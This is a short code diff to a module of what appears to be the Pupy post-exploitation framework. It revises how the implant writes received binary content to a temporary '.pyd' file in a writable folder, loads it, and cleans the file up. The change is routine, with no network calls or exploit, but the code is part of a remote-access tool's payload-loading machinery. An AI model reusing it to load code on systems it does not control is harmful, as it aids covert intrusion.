@@ -6,7 +6,8 @@ __all__ = (
 
 
 from tempfile import mkstemp
-from os import unlink
+from os import unlink, fdopen
+from errno import EACCES
 
 import pupy
 
@@ -15,10 +16,17 @@ from .utils import load_library_common, find_writable_folder
 
 def _does_dest_allows_executable_mappings(folder):
     try:
-        fd, tmp_file = mkstemp(prefix='.pyd', dir=folder)
+        fd, tmp_file = mkstemp(
+            suffix='.pyd', dir=folder)
     except OSError as e:
         pupy.dprint('Folder {} is not accessible: {}', folder, e)
         return False
+
+    try:
+        unlink(tmp_file)
+    except OSError as e:
+        pupy.dprint('Could not delete temporary file: {}', tmp_file, e)
+        pass
 
     return True
 
@@ -30,11 +38,16 @@ DROP_DIR = find_writable_folder(
 
 
 def load_content(content, name, dlopen=False, initfuncname=None):
-    fd, filepath = mkstemp(dir=DROP_DIR)
+    fd, filepath = mkstemp(suffix='.pyd', dir=DROP_DIR)
+    fobj = fdopen(fd, 'wb')
     try:
         return load_library_common(
-            fd, filepath, content, name, dlopen, initfuncname
+            fobj, filepath, content, name, dlopen, initfuncname,
+            close=True
         )
     finally:
-        unlink(filepath)
-        fd.close()
+        try:
+            unlink(filepath)
+        except WindowsError as e:
+            if e.errno == EACCES:
+                pass
